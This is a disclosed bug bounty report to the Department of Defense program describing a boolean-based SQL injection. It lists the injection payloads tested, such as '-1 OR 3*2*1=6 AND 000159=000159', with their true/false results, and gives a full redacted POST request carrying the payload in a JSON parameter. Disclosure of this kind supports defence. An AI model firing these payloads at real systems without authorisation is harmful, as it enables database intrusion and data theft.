# SQL injection my method -1 OR 3*2*1=6 AND 000159=000159

## Report Details
- **Report ID**: 1250293
- **URL**: https://hackerone.com/reports/1250293
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-07-02T21:26:12.529Z
- **Disclosed**: 2021-07-29T19:51:13.408Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
URL:
    https://█████

Parameter:
    ███

Attack Details

JSON input █████ was set to -1 OR 3*2*1=6 AND 000159=000159

Tests performed:

    -1 OR 2+159-159-1=0+0+0+1 => TRUE
    -1 OR 3+159-159-1=0+0+0+1 => FALSE
    -1 OR 3*2<(0+5+159-159) => FALSE
    -1 OR 3*2>(0+5+159-159) => FALSE
    -1 OR 2+1-1+1=1 AND 000159=000159 => FALSE
    -1 OR 3*2=5 AND 000159=000159 => FALSE
    -1 OR 3*2=6 AND 000159=000159 => TRUE
    -1 OR 3*2*0=6 AND 000159=000159 => FALSE
    -1 OR 3*2*1=6 AND 000159=000159 => TRUE

Original value: 51 

Vulnerability Description

SQL injection (SQLi) refers to an injection attack wherein an attacker can execute malicious SQL statements that control a web application's database server.

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
http request
==============
POST /█████0 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://███/
Cookie: ASP.NET_SessionId=███████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 1031
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36
Host: █████████
Connection: Keep-alive

██████&__EVENTARGUMENT=-%7Cpublic%7CGetDirs&__EVENTTARGET=ResourceManager1&__EVENTVALIDATION=oSBfIwV8vHrmOrmbrTnFRCqXUL/aKiWgwUHyEAR99v8UPlosE%2BoGKWAXIyeVlw6XRDeycmf020z48gy5%2BWyZMfDNWeC00FVAC4Bfg6/TkHzFdksbhJywKOVC0yTqOA2uNp5XjQ==&__VIEWSTATE=█████&__VIEWSTATEENCRYPTED=&__VIEWSTATEGENERATOR=3257FB69&submitDirectEventConfig={"config":{"extraParams":{"sDirID":"-1%20OR%203*2*1=6%20AND%20000159=000159"}}}&txtSearchBox=the


```

    <script type="text/javascript">
    //<![CDATA[
        ████████);
    //]]>
    </script>
</head>

 <body>
 
  <form method="post" action="./███0" id="Form1" style="margin:0 auto 0 auto;">
<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="██████████" />
</div>
```

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
